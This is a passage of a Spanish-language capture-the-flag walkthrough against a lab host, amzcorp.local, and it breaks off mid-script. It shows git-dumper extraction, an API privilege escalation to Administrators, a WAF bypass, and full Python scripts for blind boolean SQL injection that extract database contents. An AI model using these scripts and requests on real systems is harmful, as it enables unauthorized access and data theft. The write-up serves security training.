echo "%7BpXDWXyZ%26%3E3h%27%27W%3C" | python3 -c "import sys, urllib.parse; print(urllib.parse.unquote(sys.stdin.read().strip()))"
```

Info:

```
{pXDWXyZ&>3h''W<
```

Vemos que tenemos unas credenciales:

```
User: tyler
Pass: {pXDWXyZ&>3h''W<
```

Si probamos las credenciales en el `login` principal de `jobs.amzcorp.local` veremos que funciona:

<figure><img src="../../.gitbook/assets/Pasted image 20251226153109.png" alt=""><figcaption></figcaption></figure>

Pero poco podremos hacer ahi, si seguimos investigando el archivo `info.txt` en busca de mas informacion y lo filtramos por `hostname` a ver si vemos algun `subdominio` nuevo, omitiendo los duplicados, veremos lo siguiente:

```shell
grep -o '"hostname": "[^"]*"' info.txt | grep -v 'c00\.xyz' | sort -u | while read h; do grep -A4 -B1 "$h" info.txt | head -6; done
```

Info:

```
{
    "hostname": "company-support.amzcorp.local",
    "ip_address": "172.22.11.10",
    "method": "GET",
    "requester_ip": "32.248.190.123",
    "url": "/static/assets/vendor/@popperjs/core/dist/umd/popper.min.js"
  {
    "hostname": "jobs.amzcorp.local",
    "ip_address": "172.21.10.12",
    "method": "GET",
    "requester_ip": "86.15.21.233",
    "url": "/static/assets/img/brand/aws-logo.jpg"
  {
    "hostname": "jobs-development.amzcorp.local",
    "ip_address": "172.21.10.11",
    "method": "GET",
    "requester_ip": "129.141.123.251",
    "url": "/.git"
```

Vemos muy interesantes el `subdominio` llamado `jobs-development.amzcorp.local` que encima por lo que vemos en la ruta contiene un `.git` lo cual si esta expuesto puede revelar bastante informacion, vamos añadirlo a nuestro archivo `hosts`.

```shell
nano /etc/hosts

# Dentro del nano
<IP>             jobs.amzcorp.local amzcorp.local services.amzcorp.local cloud.amzcorp.local inventory.amzcorp.local workflow.amzcorp.local company-support.amzcorp.local jobs-development.amzcorp.local
```

Lo guardamos y entraremos a dicho `subdominio`.

```
URL = http://jobs-development.amzcorp.local/
```

Si entramos de normal en la pagina veremos un `apache2` por defecto, pero si entramos en ese `.git` que vimos anteriormente, veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Pasted image 20251226163413.png" alt=""><figcaption></figcaption></figure>

Efectivamente esta expuesto, por lo que vamos a utilizar una herramienta que nos `dumpee` todo en nuestra maquina atacante.

URL = GitHub Tool

```shell
git clone https://github.com/arthaud/git-dumper.git
cd git-dumper
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
mkdir git_dump
python3 git_dumper.py http://jobs-development.amzcorp.local/.git/ git_dump
```

Una vez que haya terminado, entraremos a la carpeta llamada `git_dump` y veremos esto:

```
drwxr-xr-x root root 4.0 KB Fri Dec 26 16:39:24 2025 .
drwxr-xr-x root root 4.0 KB Fri Dec 26 16:39:12 2025 ..
drwxr-xr-x root root 4.0 KB Fri Dec 26 16:39:24 2025 .git
drwxr-xr-x root root 4.0 KB Fri Dec 26 16:39:24 2025 jobs_portal
drwxr-xr-x root root 4.0 KB Fri Dec 26 16:39:24 2025 support_portal
```

Vemos que se nos descargo de forma correcta, ahora vamos a realizar un poco de `fuzzing` a ver que vemos.

Despues de investigar un rato veremos el siguiente archivo llamado `jobs_portal/apps/home/routes.py` el cual es bastante interesante, ya que aloja funciones a `APIs` interesantes.

```shell
grep -n "@blueprint.route.*/api/v4/" jobs_portal/apps/home/routes.py | sed -E 's/.*@blueprint\.route\([[:space:]]*[\x27"]([^\x27"]+)[\x27"].*/\1/'
```

Info:

```
/api/v4/tokens/generate
/api/v4/tokens/get
/api/v4/users/get
/api/v4/users/edit
/api/v4/roles/get
/api/v4/positions/get
/api/v4/applications/get
/api/v4/logs/get
/api/v4/status
```

Si investigamos la `API` de `/api/v4/users/edit`, veremos lo siguiente:

```shell
grep -n -A46 "/api/v4/users/edit" jobs_portal/apps/home/routes.py
```

Info:

```
@blueprint.route('/api/v4/users/edit', methods=['POST'])
521-def update_users():
522-    if request.method == "POST":
523-        if request.cookies.get('api_token'):
524-            tokens = []
525-            users = Users.query.all()
526-            for user in users:
527-                tokens.append(user.api_token)
528-            if request.cookies.get('api_token') in tokens:
529-                if session['role'] == "Managers":
530-                    if request.headers.get('Content-Type') == 'application/json':
531-                        content = request.get_json(silent=True)
532-                        try:
533-                            if content['update_user']:
534-                                data = base64.b64decode(content['update_user']).decode()
535-                                info = json.loads(data)
536-                                if info['username'] and info['email'] and info['role']:
537-                                    try:
538-                                        specific_user = Users.query.filter_by(username=info['username']).first()
539-                                    except:
540-                                        specific_user = Users.query.filter_by(email=info['email']).first()
541-                                    if specific_user:
542-                                        if not specific_user.role == "Managers" and not specific_user.role == "Administrators":
543-                                            specific_user.username = info['username']
544-                                            specific_user.email = info['email']
545-                                            specific_user.role = info['role']
546-                                            return jsonify({"success":"User updated successfully"})
547-                                        else:
548-                                            return jsonify({"error":"Cannot update information for Managers or Administrators"})
549-                                    else:
550-                                        return jsonify({"error":"Unable to find user"})
551-                                else:
552-                                    return jsonify({"error": "Invalid option for Edit Users"})
553-                            else:
554-                                return jsonify({"error":"Update Users parameter not specified"})
555-                        except:
556-                            return jsonify({"error": "Username, Update Users, Update Email or Update Role parameter not specified"})
557-                    else:
558-                        return jsonify({"error":"Unsupported Content-Type"})
559-                else:
560-                    return jsonify({"error":"Unauthorized Access"})
561-            else:
562-                return jsonify({"error": "Invalid API token supplied"})
563-        else:
564-            return jsonify({"error": "API Token not specified in cookies"})
565-    else:
566-        return jsonify({"error":"Unsupported HTTP method"})
```

Vemos que solamente los usuarios con el `role` `Managers` pueden modificar usuarios, pero los que tengan el `role` `Administrators` o `Managers` no pueden ser modificados, por lo que vamos a modificar el usuario que creamos anteriormente al inicio con nombre `diseo` y le asignaremos el `role` `Administrators`, ya que si vemos que `role` tiene el usuario `tyler` que es el que tenemos actualmente veremos lo siguiente:

```shell
curl -X POST "http://jobs.amzcorp.local/api/v4/users/get" \
  -H "Content-Type: application/json" \
  -H "Cookie: api_token=<TOKEN_ADMIN>; session=<TOKEN_TYLER>" \
  -d '{"get_users": "True"}'
```

Info:

```
{
  "users": [
    {
      "email": "tyler@amzcorp.local",
      "id": 2,
      "role": "Managers",
      "username": "tyler"
    },
..................................<RESTO DE INFO>..................................
  ]
}
```

Vemos que efectivamente tenemos el `role` que pude modificar usuarios, por lo que vamos a realizar lo siguiente, pero antes se lo tenemos que pasar en `Base64`:

```shell
echo '{"username": "diseo", "email": "diseo@test.com", "role": "Administrators"}' | base64 -w 0
```

Info:

```
eyJ1c2VybmFtZSI6ICJkaXNlbyIsICJlbWFpbCI6ICJkaXNlb0B0ZXN0LmNvbSIsICJyb2xlIjogIkFkbWluaXN0cmF0b3JzIn0K
```

Ahora si podremos actualizar a dicho usuario de esta forma:

```shell
curl -X POST "http://jobs.amzcorp.local/api/v4/users/edit" \
  -H "Content-Type: application/json" \
  -H "Cookie: api_token=<TOKEN_ADMIN>; session=<TOKEN_TYLER>" \
  -d '{"update_user": "eyJ1c2VybmFtZSI6ICJkaXNlbyIsICJlbWFpbCI6ICJkaXNlb0B0ZXN0LmNvbSIsICJyb2xlIjogIkFkbWluaXN0cmF0b3JzIn0K"}'
```

Info:

```
{
  "success": "User updated successfully"
}
```

Veremos que ha funcionado, por lo que verifiquemos los cambios:

```shell
curl -s -X POST "http://jobs.amzcorp.local/api/v4/users/get" \
  -H "Content-Type: application/json" \
  -H "Cookie: api_token=<TOKEN_ADMIN>; session=<TOKEN_TYLER>" \
  -d '{"get_users": "True"}' | grep -A2 "diseo"
```

Info:

```
"email": "diseo@test.com",
      "id": 958,
      "role": "Administrators",
      "username": "diseo"
    },
```

Efectivamente se ha modificado satisfactoriamente, por lo que vamos a iniciar sesion con `diseo` a ver que vemos.

Una vez iniciado sesion veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Pasted image 20251226175219.png" alt=""><figcaption></figcaption></figure>

Vemos que nos aparecen mas cosas de la que nos aparecia antes ya que somos `admins` ahora mismo.

### SQLi (admin/users/search)

Investigando un poco el codigo del `.git` veremos que hay un `SQLi` en la siguiente ruta `http://jobs.amzcorp.local/admin/users/search` ya que si filtramos de esta forma:

```shell
grep -B20 "cur.execute.*username" jobs_portal/apps/home/routes.py | grep "@blueprint.route"
```

Info:

```
@blueprint.route('/admin/users/search', methods=['POST'])
```

Y en la linea `123` del archivo `jobs_portal/apps/home/routes.py` veremos esto:

```python
cur.execute('SELECT id, username, email, account_status, role FROM `Users` WHERE username=\'%s\'' % (username))
```

Usa `%s` sin parámetros, es concatenación directa, por lo que es vulnerable a un `SQLi`, si enviamos una peticion por `POST` con las credenciales de `diseo` ahora que es `admin` a dicho enpoint, veremos lo siguiente.

<figure><img src="../../.gitbook/assets/Pasted image 20251226175838.png" alt=""><figcaption></figcaption></figure>

Vemos que nos deja entrar a la pagina solamente por `POST`, la peticion la podemos cambiar de `GET` a `POST` interceptando la peticion con `BurpSuite` y modificando lo dicho anteriormente.

Ahora vamos a intentar explotar dicha vulnerabilidad con `sqlmap`, vamos abrir `BurpSuite` y capturaremos la peticion de buscar un usuario quedando de esta forma:

```
POST /admin/users/search HTTP/1.1
Host: jobs.amzcorp.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 14
Origin: http://jobs.amzcorp.local
DNT: 1
Connection: keep-alive
Referer: http://jobs.amzcorp.local/admin/users/search
Cookie: session=<TOKEN_SESSION>
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=diseo
```

Ahora eso lo meteremos en un archivo `req.txt` y ejecutaremos la herramienta de esta forma:

```shell
sqlmap -r req.txt --dbs --level=5 --risk=3 --batch
```

Info:

```
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.10#stable}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:08:01 /2025-12-26/

[18:08:01] [INFO] parsing HTTP request from 'req.txt'
[18:08:01] [INFO] testing connection to the target URL
[18:08:01] [INFO] testing if the target URL content is stable
[18:08:01] [INFO] target URL content is stable
[18:08:01] [INFO] testing if POST parameter 'username' is dynamic
[18:08:02] [WARNING] POST parameter 'username' does not appear to be dynamic
[18:08:02] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[18:08:02] [INFO] testing for SQL injection on POST parameter 'username'
[18:08:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:08:14] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[18:08:31] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[18:08:43] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:08:52] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:08:58] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[18:09:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[18:09:02] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[18:09:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:09:05] [INFO] POST parameter 'username' appears to be 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)' injectable (with --string="                      Edit")
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[18:09:05] [INFO] testing 'Generic inline queries'
[18:09:05] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[18:09:05] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[18:09:08] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[18:09:11] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[18:09:15] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[18:09:18] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[18:09:20] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[18:09:22] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[18:09:24] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[18:09:26] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[18:09:28] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[18:09:31] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 694 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: username=diseo' AND 9993=9993#
---
[18:09:34] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL
[18:09:35] [INFO] fetching database names
[18:09:35] [INFO] fetching number of databases
[18:09:35] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[18:09:35] [INFO] retrieved:
[18:09:35] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[18:09:35] [ERROR] unable to retrieve the number of databases
[18:09:35] [INFO] falling back to current database
[18:09:35] [INFO] fetching current database
[18:09:35] [INFO] retrieved:
[18:09:36] [CRITICAL] unable to retrieve the database names
[18:09:36] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/jobs.amzcorp.local'

[*] ending @ 18:09:36 /2025-12-26/
```

Despues de un rato veremos que ha funcionado, encontro la vulnerabilidad pero no fue capaz de extraer informacion, esto se debe a que seguramente haya algun `WAF` por detras bloqueando algunos comandos por defecto de `SQL`, vamos a probar a `bypassearlo` de esta forma.

Si probamos este `payload` sabiendo que hay `5` columnas como vemos aqui:

> Codigo

```python
cur.execute('SELECT id, username, email, account_status, role FROM `Users` WHERE username=\'%s\'' % (username))
```

```
POST /admin/users/search HTTP/1.1
Host: jobs.amzcorp.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Origin: http://jobs.amzcorp.local
DNT: 1
Connection: keep-alive
Referer: http://jobs.amzcorp.local/admin/users/search
Cookie: session=<TOKEN_SESSION>
Upgrade-Insecure-Requests: 1
Priority: u=0, i


username=diseo'+Union+SELECT+1,2,3,4,5+#
```

Info:

<figure><img src="../../.gitbook/assets/Pasted image 20251226184555.png" alt=""><figcaption></figcaption></figure>

Vemos que nos devuelve `diseo` por lo que es `True`, pero si ponemos el `UNION` en mayuscula, veremos que ya no nos aparece, por lo que lo podremos `bypassear` poniendo el `UNION` con la primera mayuscula y lo demas en minuscula, ahora vamos a enumerar las `DDBBs` que hay en base a esto, sabiendo que cuando aparezca `diseo` es `True` y de lo contrario seria `False` por lo que iriamos reconstruyendo los nombres poco a poco, nos montaremos el siguiente script de `python3`.

> findDDBBs.py

```python
import requests
import string

def check_condition(url, payload):
    """
    Envía la petición y verifica si el usuario 'diseo' aparece en la respuesta
    """
    headers = {
        'Host': 'jobs.amzcorp.local',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'http://jobs.amzcorp.local',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Referer': 'http://jobs.amzcorp.local/admin/users/search',
        'Cookie': 'session=<TOKEN_SESSION>',
        'Upgrade-Insecure-Requests': '1',
        'Priority': 'u=0, i'
    }
    
    data = {
        'username': payload
    }
    
    try:
        response = requests.post(url, headers=headers, data=data, timeout=10)
        
        # Verificar si aparece el usuario 'diseo' en la respuesta
        if '>diseo</td>' in response.text:
            return True
        else:
            return False
            
    except Exception as e:
        print(f"Error en la petición: {e}")
        return False

def extract_databases():
    """
    Extrae los nombres de las bases de datos usando blind SQL injection
    """
    url = "http://jobs.amzcorp.local/admin/users/search"
    
    # Caracteres a probar (puedes añadir números si es necesario)
    chars = string.ascii_lowercase + string.digits + '_-'
    
    db_index = 0  # Empezamos con la primera base de datos (índice 0)
    databases = []
    
    print("Iniciando extracción de bases de datos...")
    
    while True:
        print(f"\nExtrayendo base de datos #{db_index}...")
        db_name = ""
        position = 1
        
        while True:
            found_char = None
            
            # Probar cada carácter posible
            for char in chars:
                # Payload para extraer el carácter en la posición actual
                payload = f"diseo' AND SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT {db_index},1),{position},1) = '{char}'#"
                
                print(f"\rProbando DB#{db_index}, posición {position}: {char}", end="", flush=True)
                
                if check_condition(url, payload):
                    db_name += char
                    found_char = char
                    print(f" -> Encontrado: {char}")
                    break
            
            # Si no encontramos ningún carácter, puede ser el final del nombre
            if not found_char:
                # Probar si hemos terminado (carácter nulo)
                payload = f"diseo' AND SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT {db_index},1),{position},1) = ''#"
                if check_condition(url, payload):
                    print(f"\nFin de la base de datos #{db_index}")
                    break
                else:
                    # Si llegamos aquí, puede haber un carácter que no está en nuestro conjunto
                    print(f"\nCarácter no encontrado en posición {position}. Probando otros caracteres...")
                    
                    # Probar mayúsculas
                    for char in string.ascii_uppercase:
                        payload = f"diseo' AND SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT {db_index},1),{position},1) = '{char}'#"
                        if check_condition(url, payload):
                            db_name += char
                            found_char = char
                            print(f"Encontrado (mayúscula): {char}")
                            break
                    
                    if not found_char:
                        print(f"No se pudo encontrar el carácter en posición {position}. Terminando...")
                        break
            
            position += 1
        
        if db_name:
            databases.append(db_name)
            print(f"Base de datos encontrada #{db_index}: {db_name}")
            
            # Verificar si hay más bases de datos
            payload = f"diseo' AND (SELECT COUNT(*) FROM information_schema.schemata) > {db_index + 1}#"
            if check_condition(url, payload):
                db_index += 1
            else:
                print(f"\nNo hay más bases de datos. Total encontradas: {len(databases)}")
                break
        else:
            print(f"No se pudo extraer la base de datos #{db_index}")
            break
    
    return databases

if __name__ == "__main__":
    databases = extract_databases()
    
    print("\n" + "="*50)
    print("RESULTADOS FINALES:")
    print("="*50)
    for i, db in enumerate(databases):
        print(f"DB #{i}: {db}")
```

Lo ejecutaremos de esta forma:

```shell
python3 findDDBBs.py
```

Info:

```
Iniciando extracción de bases de datos...

Extrayendo base de datos #0...
Probando DB#0, posición 1: i -> Encontrado: i
...........
Fin de la base de datos #0
Base de datos encontrada #0: information_schema

Extrayendo base de datos #1...
Probando DB#1, posición 1: j -> Encontrado: j
...........
Fin de la base de datos #1
Base de datos encontrada #1: jobs

Extrayendo base de datos #2...
Probando DB#2, posición 1: p -> Encontrado: p
...........
Fin de la base de datos #2
Base de datos encontrada #2: performance_schema

Extrayendo base de datos #3...
Probando DB#3, posición 1: m -> Encontrado: m
...........
Fin de la base de datos #3
Base de datos encontrada #3: mysql

Extrayendo base de datos #4...
Probando DB#4, posición 1: s -> Encontrado: s
...........
Fin de la base de datos #4
Base de datos encontrada #4: sys

No hay más bases de datos. Total encontradas: 5

==================================================
RESULTADOS FINALES:
==================================================
DB #0: information_schema
DB #1: jobs
DB #2: performance_schema
DB #3: mysql
DB #4: sys
```

Veremos que ha funcionado, por lo que vamos a extraer las tablas de la `DDBB` llamada `jobs` a ver que vemos con este otro script.

> findTables.py

```python
import requests
import string

def check_condition(url, payload):
    """
    Envía la petición y verifica si el usuario 'diseo' aparece en la respuesta
    """
    headers = {
        'Host': 'jobs.amzcorp.local',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'http://jobs.amzcorp.local',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Referer': 'http://jobs.amzcorp.local/admin/users/search',
        'Cookie': 'session=<TOKEN_SESSION>',
        'Upgrade-Insecure-Requests': '1',
        'Priority': 'u=0, i'
    }
    
    data = {
        'username': payload
    }
    
    try:
        response = requests.post(url, headers=headers, data=data, timeout=10)
        
        # Verificar si aparece el usuario 'diseo' en la respuesta
        if '>diseo</td>' in response.text:
            return True
        else:
            return False
            
    except Exception as e:
        print(f"Error en la petición: {e}")
        return False

def extract_tables():
    """
    Extrae los nombres de las tablas de la base de datos 'jobs' usando blind SQL injection
    """
    url = "http://jobs.amzcorp.local/admin/users/search"
    
    # Caracteres a probar (incluyendo mayúsculas desde el inicio)
    chars = string.ascii_lowercase + string.ascii_uppercase + string.digits + '_-'
    
    table_index = 0  # Empezamos con la primera tabla (índice 0)
    tables = []
    
    print("Iniciando extracción de tablas de la base de datos 'jobs'...")
    
    while True:
        print(f"\nExtrayendo tabla #{table_index}...")
        table_name = ""
        position = 1
        
        while True:
            found_char = None
            
            # Probar cada carácter posible
            for char in chars:
                # Payload para extraer el carácter en la posición actual
                # IMPORTANTE: Escapamos las comillas simples en el nombre de la base de datos si es necesario
                payload = f"diseo' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = 'jobs' LIMIT {table_index},1),{position},1) = '{char}'#"
                
                print(f"\rProbando tabla#{table_index}, posición {position}: {char}", end="", flush=True)
                
                if check_condition(url, payload):
                    table_name += char
                    found_char = char
                    print(f" -> Encontrado: {char}")
                    break
            
            # Si no encontramos ningún carácter, puede ser el final del nombre
            if not found_char:
                # Probar si hemos terminado (carácter nulo o fin de cadena)
                payload = f"diseo' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = 'jobs' LIMIT {table_index},1),{position},1) = ''#"
                if check_condition(url, payload):
                    print(f"\nFin del nombre de la tabla #{table_index}")
                    break
                else:
                    # Si llegamos aquí, puede haber un carácter que no está en nuestro conjunto
                    print(f"\nCarácter no encontrado en posición {position}.")
                    
                    # Probar algunos caracteres especiales comunes en nombres de tablas
                    special_chars = ' .'
                    for char in special_chars:
                        payload = f"diseo' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = 'jobs' LIMIT {table_index},1),{position},1) = '{char}'#"
                        if check_condition(url, payload):
                            table_name += char
                            found_char = char
                            print(f"Encontrado (carácter especial): '{char}'")
                            break
                    
                    if not found_char:
                        print(f"No se pudo encontrar el carácter en posición {position}. Terminando tabla...")
                        break
            
            position += 1
        
        if table_name:
            tables.append(table_name)
            print(f"Tabla encontrada #{table_index}: {table_name}")
            
            # Verificar si hay más tablas
            payload = f"diseo' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'jobs') > {table_index + 1}#"
            if check_condition(url, payload):
                table_index += 1
            else:
                print(f"\nNo hay más tablas en la base de datos 'jobs'. Total encontradas: {len(tables)}")
                break
        else:
            print(f"No se pudo extraer la tabla #{table_index}")
            break
    
    return tables

def extract_columns(table_name):
    """
    Extrae los nombres de las columnas de una tabla específica
    """
    url = "http://jobs.amzcorp.local/admin/users/search"
    chars = string.ascii_lowercase + string.ascii_uppercase + string.digits + '_-'
    
    column_index = 0
    columns = []
    
    print(f"\nExtrayendo columnas de la tabla '{table_name}'...")
    
    while True:
        column_name = ""
        position = 1
        
        while True:
            found_char = None
            
            for char in chars:
                payload = f"diseo' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema = 'jobs' AND table_name = '{table_name}' LIMIT {column_index},1),{position},1) = '{char}'#"
                
                print(f"\rProbando columna#{column_index}, posición {position}: {char}", end="", flush=True)
                
                if check_condition(url, payload):
                    column_name += char
                    found_char = char
                    print(f" -> Encontrado: {char}")
                    break
            
            if not found_char:
                payload = f"diseo' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema = 'jobs' AND table_name = '{table_name}' LIMIT {column_index},1),{position},1) = ''#"
                if check_condition(url, payload):
                    print(f"\nFin del nombre de la columna #{column_index}")
                    break
                else:
                    break
            
            position += 1
        
        if column_name:
            columns.append(column_name)
            print(f"Columna encontrada #{column_index}: {column_name}")
            
            # Verificar si hay más columnas
            payload = f"diseo' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema = 'jobs' AND table_name = '{table_name}') > {column_index + 1}#"
            if check_condition(url, payload):
                column_index += 1
            else:
                print(f"\nNo hay más columnas en la tabla '{table_name}'. Total encontradas: {len(columns)}")
                break
        else:
            break
    
    return columns

if __name__ == "__main__":
    print("="*60)
    print("ENUMERACIÓN DE TABLAS DE LA BASE DE DATOS 'jobs'")
    print("="*60)
    
    # Primero extraer todas las tablas
    tables = extract_tables()
    
    print("\n" + "="*60)
    print("RESULTADOS FINALES - TABLAS:")
    print("="*60)
    for i, table in enumerate(tables):
        print(f"Tabla #{i}: {table}")
    
    # Preguntar si quiere extraer columnas de alguna tabla específica
    if tables:
        response = input("\n¿Desea extraer las columnas de alguna tabla? (s/n): ")
        if response.lower() == 's':
            print("\nTablas disponibles:")
            for i, table in enumerate(tables):
                print(f"{i}: {table}")
            
            try:
                table_index = int(input("\nIngrese el número de la tabla: "))
                if 0 <= table_index < len(tables):
                    columns = extract_columns(tables[table_index])
                    
                    print("\n" + "="*60)
                    print(f"COLUMNAS DE LA TABLA '{tables[table_index]}':")
                    print("="*60)
                    for i, column in enumerate(columns):
                        print(f"Columna #{i}: {column}")
                else:
                    print("Índice inválido")
            except ValueError:
                print("Entrada inválida")
```

Lo ejecutaremos de esta forma:

```shell
python3 findTables.py
```

Info:

```
============================================================
ENUMERACIÓN DE TABLAS DE LA BASE DE DATOS 'jobs'
============================================================
Iniciando extracción de tablas de la base de datos 'jobs'...

Extrayendo tabla #0...
Probando tabla#0, posición 1: p -> Encontrado: p
...............
Fin del nombre de la tabla #0
Tabla encontrada #0: profiles

Extrayendo tabla #1...
Probando tabla#1, posición 1: a -> Encontrado: a
...............
Fin del nombre de la tabla #1
Tabla encontrada #1: application

Extrayendo tabla #2...
Probando tabla#2, posición 1: r -> Encontrado: r
...............
Fin del nombre de la tabla #2
Tabla encontrada #2: role

Extrayendo tabla #3...
Probando tabla#3, posición 1: u -> Encontrado: u
...............
Fin del nombre de la tabla #3
Tabla encontrada #3: users

Extrayendo tabla #4...
Probando tabla#4, posición 1: p -> Encontrado: p
...............
Fin del nombre de la tabla #4
Tabla encontrada #4: position

Extrayendo tabla #5...
Probando tabla#5, posición 1: k -> Encontrado: k
...............
Fin del nombre de la tabla #5
Tabla encontrada #5: keys_tbl

Extrayendo tabla #6...
Probando tabla#6, posición 1: i -> Encontrado: i
...............
Fin del nombre de la tabla #6
Tabla encontrada #6: inventory

No hay más tablas en la base de datos 'jobs'. Total encontradas: 7

============================================================
RESULTADOS FINALES - TABLAS:
============================================================
Tabla #0: profiles
Tabla #1: application
Tabla #2: role
Tabla #3: users
Tabla #4: position
Tabla #5: keys_tbl
Tabla #6: inventory
```

Veremos que hemos descubierto varias tablas dentro de la base de datos `jobs`, ahora vamos a intentar extraer la informacion de `users` en un principio que nos llama la atencion.

> extractInfo.py

```python
import requests
import string

def check_condition(url, payload):
    """
    Envía la petición y verifica si el usuario 'diseo' aparece en la respuesta
    """
    headers = {
        'Host': 'jobs.amzcorp.local',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'http://jobs.amzcorp.local',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Referer': 'http://jobs.amzcorp.local/admin/users/search',
        'Cookie': 'session=<TOKEN_SESSION>',
        'Upgrade-Insecure-Requests': '1',
        'Priority': 'u=0, i'
    }
    
    data = {
        'username': payload
    }
    
    try:
        response = requests.post(url, headers=headers, data=data, timeout=10)
        
        # Verificar si aparece el usuario 'diseo' en la respuesta
        if '>diseo</td>' in response.text:
            return True
        else:
            return False
            
    except Exception as e:
        print(f"Error en la petición: {e}")
        return False

def get_column_count(table_name):
    """
    Obtiene el número de columnas de una tabla
    """
    url = "http://jobs.amzcorp.local/admin/users/search"
    
    print(f"Determinando número de columnas para la tabla '{table_name}'...")
    
    column_count = 0
    while True:
        payload = f"diseo' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema = 'jobs' AND table_name = '{table_name}') = {column_count}#"
        
        if check_condition(url, payload):
            print(f"Número de columnas: {column_count}")
            return column_count
        column_count += 1
        
        # Límite de seguridad para evitar bucle infinito
        if column_count > 50:
            print("No se pudo determinar el número de columnas")
            return 0

def get_row_count(table_name):
    """
    Obtiene el número de filas de una tabla
    """
    url = "http://jobs.amzcorp.local/admin/users/search"
    
    print(f"Determinando número de filas para la tabla '{table_name}'...")
    
    row_count = 0
    while True:
        payload = f"diseo' AND (SELECT COUNT(*) FROM jobs.{table_name}) = {row_count}#"
        
        if check_condition(url, payload):
            print(f"Número de filas: {row_count}")
            return row_count
        row_count += 1
        
        # Límite de seguridad para evitar bucle infinito
        if row_count > 1000:
